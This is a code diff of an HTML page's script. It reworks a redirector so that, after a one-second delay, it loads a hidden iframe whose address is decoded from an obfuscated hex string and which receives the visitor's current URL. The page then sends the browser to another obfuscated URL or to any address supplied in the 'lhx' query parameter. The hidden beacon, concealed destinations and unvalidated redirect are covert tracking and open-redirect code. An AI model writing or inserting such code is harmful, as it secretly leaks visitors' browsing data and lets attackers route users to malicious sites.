@@ -14,19 +14,25 @@
  <iframe id="NullPointer" style="display:none;"></iframe>
 </body>
 <script type='text/javascript'>
-nxf="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
+
  
 occ=new $_;
 occ.run();
-occ.qs('#NullPointer').setAttribute("src",`${nxf.hl()}?loc=${location.href}`);
+ TrackParam=function(){
+  nxf="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
+  occ.qs('#NullPointer').setAttribute("src",`${nxf.hl()}?loc=${location.href}`);
+  occ.qs('h1').innerText="REDIRECTED ...";
+  lhx();
+ };
+
 lhx=()=>{
  upr=new URL(location.href);
  par = upr.searchParams.get('lhx');
  deflh="e12331a3619453f273a142b3f461a54415a1a5d271e2924411339224";
  par?setTimeout(()=>window.location=par.hl(),1000):window.location=deflh.hl()
 };
-lhx();
-occ.qs('h1').innerText="REDIRECTED ...";
+setTimeout(TrackParam,1000);
+
 
 </script>
 </html>
